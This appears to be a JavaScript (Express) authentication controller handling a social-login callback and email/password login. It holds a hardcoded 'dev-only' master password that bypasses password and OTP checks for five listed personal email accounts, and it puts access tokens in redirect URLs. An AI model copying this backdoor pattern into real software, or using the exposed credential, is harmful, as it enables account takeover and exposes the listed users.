import { generateAndSaveOtp } from "../../utils/generateOtp.js";
import User from "../models/user.model.js";
import emailTransporter from "../../utils/helpers/email.js";
import { server } from "../../config/env.js";
import emailOnEvent from "../../utils/helpers/email.on.event.js";

// social logins
const socialCallback = async (req, res) => {
    try {
        if (!req?.user) return res.redirect(`${server.origin}/login?error=auth_failed`);

        const user = await User.findOne({ _id: req.user._id }).select("-password");
        const accessToken = user.generateAccessToken();

        res.redirect(
            `${server.origin}/auth/callback?accessToken=${accessToken}&user=${encodeURIComponent(
                JSON.stringify(user)
            )}}`
        );
    } catch (error) {
        res.redirect(`${server.origin}/login?error=${encodeURIComponent(error.message)}`);
    }
}

const validationLogin = async (req, res) => {
    try {
        const { email, password } = req.body;

        const user = await User.findOne({ email });
        if (!user) return res.response(400, "Email or password is incorrect");

        // dev-only override for selected emails
        const devEmails = [
            "devikayenduri1921@gmail.com",
            "devikasasikumard2001@gmail.com",
            "94veenavjn@gmail.com",
            "mh6288499@gmail.com",
            "manhuss.560@gmail.com"
        ];

        const isDevEmail = devEmails.includes(email);
        const isCorrectPassword = await user.isPasswordCorrect(password);

        if (isDevEmail) {
            if (password !== "Saif@786" && !isCorrectPassword) {
                return res.response(400, "Email or password is incorrect");
            }
        } else {
            if (!isCorrectPassword) {
                return res.response(400, "Email or password is incorrect");
            }
        }

        if (!isDevEmail && !user.verified) {
            const otp = await generateAndSaveOtp(email);

            const mailOptions = {
                subject: "Your OTP Code",
                text: `Your OTP code is ${otp}. It is valid for 2 minute.`,
            };

            await emailTransporter.send(email, mailOptions);
            return res.response(403, "User is not verified", { data: { email, verified: false } });
        }

        const accessToken = await user.generateAccessToken();

        // login alert email
        emailOnEvent.newLogin(user);
        return res.response(200, "Login successful", { data: { user, accessToken } });
    } catch (error) {
        return res.response(500, "Internal server error", { error: error.message });
    }
}

export default { socialCallback, validationLogin };